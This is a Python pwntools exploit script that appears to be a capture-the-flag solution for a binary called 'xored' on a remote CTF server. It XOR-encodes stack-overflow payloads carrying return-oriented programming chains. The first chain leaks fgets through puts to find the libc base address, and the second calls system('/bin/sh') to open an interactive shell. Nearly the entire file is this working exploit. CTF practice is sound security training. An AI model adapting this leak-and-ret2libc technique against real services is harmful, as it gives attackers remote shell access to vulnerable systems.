#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./xored')

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30012)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main
b *main+394

continue
'''.format(**locals())
libc = ELF('./libc.so.6')
# -- Exploit goes here --
from itertools import cycle
def xorpayload(payload):
    key = b'KuCOLc5PIH3mgP6nJxF3DBHXbDHSqM0Y'
    res = b"".join([bytes([(c1^c2)]) for (c1,c2) in zip(payload,cycle(key))])
    return res
rop = ROP(exe)
rop.puts(exe.got.fgets)
rop.call(rop.ret.address)
rop.main()
io = start()

io.recvuntil(b'>')

payload = fit({
    80: rop.chain(),
    127: b'\x00',
    152: p64(0x0401266)
})

io.send(xorpayload(payload[:-1]))
io.recvuntil(b':')
io.recvline()
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym.fgets
print(f'libc base @ {hex(libc.address)}')

rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh\x00')))
io.recvuntil(b'>')

payload = fit({
    80: rop2.chain(),    
    152: p64(0x0401266)
})

io.sendline(xorpayload(payload))
io.interactive()

